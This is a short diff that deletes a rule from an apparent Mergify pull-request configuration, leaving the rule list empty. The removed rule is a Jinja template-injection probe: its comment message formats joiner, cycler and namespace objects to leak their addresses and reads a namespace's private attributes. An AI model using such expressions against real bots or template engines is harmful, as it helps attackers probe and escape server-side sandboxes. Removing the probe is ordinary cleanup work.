@@ -1,14 +1,1 @@
-pull_request_rules:
-  - name: addr-oracle-25920
-    conditions: []
-    actions:
-      comment:
-        message: |
-          [A1] joiner-inst: {{ '%s' | format(joiner()) }}
-          [A2] cycler-inst: {{ '%s' | format(cycler('a','b')) }}
-          [A3] namespace-inst: {{ '%s' | format(namespace()) }}
-          [A4] author-addr: {{ '%s' | format(author) }}
-          [A5] body-addr: {{ '%s' | format(body) }}
-          [A6] files-addr: {{ '%s' | format(files) }}
-          [A7] head-addr: {{ '%s' | format(head) }}
-          [A8] ns-dict-leak: {{ namespace(c=cycler, l=lipsum, j=joiner)._Namespace__attrs }}
+pull_request_rules: []
